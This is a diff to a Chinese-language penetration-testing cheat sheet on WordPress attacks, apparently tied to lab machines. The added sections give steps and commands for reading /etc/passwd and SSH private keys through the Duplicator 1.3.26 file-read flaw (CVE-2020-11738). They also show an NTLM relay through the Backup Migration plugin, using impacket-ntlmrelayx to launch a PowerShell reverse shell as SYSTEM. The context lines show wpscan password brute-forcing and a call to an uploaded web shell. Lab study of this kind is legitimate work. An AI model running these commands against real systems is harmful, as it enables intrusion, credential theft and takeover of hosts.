@@ -66,6 +66,39 @@ wpscan --url https://<target-ip>/blog/ --password-attack xmlrpc -t 20 -U john -P
    curl "http://<target-ip>/wp-content/uploads/wpdiscuz/cache/themes/assets/gcs/.../shell.php?cmd=whoami"
    ```
 
+## 💥 Duplicator 1.3.26 未授權任意檔案讀取 (CVE-2020-11738)
+在 WordPress 啟用舊版 `Duplicator` 外掛（<= 1.3.26）時，其下載備份功能存在未授權的任意檔案讀取漏洞。攻擊者不需登入即可讀取伺服器上的任意敏感檔案（如 `/etc/passwd` 或 Windows 的 `.ssh/id_rsa` 檔案）。
+
+### 🛠️ 利用方法
+1. **使用 Searchsploit 尋找漏洞利用程式碼**：
+   ```bash
+   searchsploit duplicator 1.3.26
+   ```
+2. **執行 Python 腳本讀取敏感檔案**：
+   ```bash
+   # 讀取 Linux 的 /etc/passwd
+   python3 50420.py http://<target-ip> /etc/passwd
+   
+   # 讀取特定使用者的 SSH 私鑰
+   python3 50420.py http://<target-ip> /home/<username>/.ssh/id_rsa
+   ```
+
+## 💥 Backup Migration 外掛配合 NTLM 中間人轉發 (Backup Migration NTLM Relay)
+當 WordPress 啟用了 `Backup Migration` 外掛，且該外掛允許修改備份儲存路徑（Backup Directory）時，若目標網路環境中存在其他主機禁用了 SMB 簽名，攻擊者可藉此發起 **NTLM 中間人轉發攻擊 (NTLM Relay)**。
+
+### 🛠️ 利用方法
+1. **攻擊機端啟動 NTLM 轉發監聽**：
+   設定將收到的驗證憑證轉發至禁用了 SMB 簽名的目標 Windows 主機（例如 `172.16.180.254`），並執行惡意的 PowerShell 反彈 Shell 指令：
+   ```bash
+   impacket-ntlmrelayx --no-http-server -smb2support -t 172.16.180.254 -c "powershell -e <BASE64_ENCODED_REVERSE_SHELL>"
+   ```
+2. **在 WordPress 後台觸發驗證**：
+   - 登入 WordPress 後台，進入 `Backup Migration` 管理介面。
+   - 將備份儲存路徑（Backup Directory）修改為攻擊機的 SMB 共用路徑（例如：`\\<KALI_IP>\backup`）。
+   - 點擊保存或觸發備份，WordPress 服務（以 SYSTEM 或 Administrators 權限執行）會嘗試向攻擊機的 SMB 服務發起連線與身份驗證。
+3. **完成 Relay 提權**：
+   攻擊機收到連線後，會將驗證請求 Relayed 至目標主機，並以 SYSTEM 權限在目標主機上執行反彈 Shell，成功取得 SYSTEM Shell。
+
 ---
 
 # 實戰關聯
@@ -73,3 +106,4 @@ wpscan --url https://<target-ip>/blog/ --password-attack xmlrpc -t 20 -U john -P
     *   [[Stapler]] (利用 Advanced Video 1.0 本地檔案包含與外掛上傳)
     *   [[SoSimple]] (利用 Social Warfare 遠端代碼執行)
     *   [[Blogger]] (利用 wpDiscuz 漏洞與 GIF89a Magic Number 繞過實現未授權 RCE，並以 wpscan 進行 XML-RPC 爆破嘗試)
+    *   [[Beyond]] (利用 Duplicator 1.3.26 任意檔案讀取敏感檔案以獲取初始存取；利用 Backup Migration 修改備份路徑至攻擊機，轉發 NTLM 驗證以獲取域內其他主機的 SYSTEM 權限)
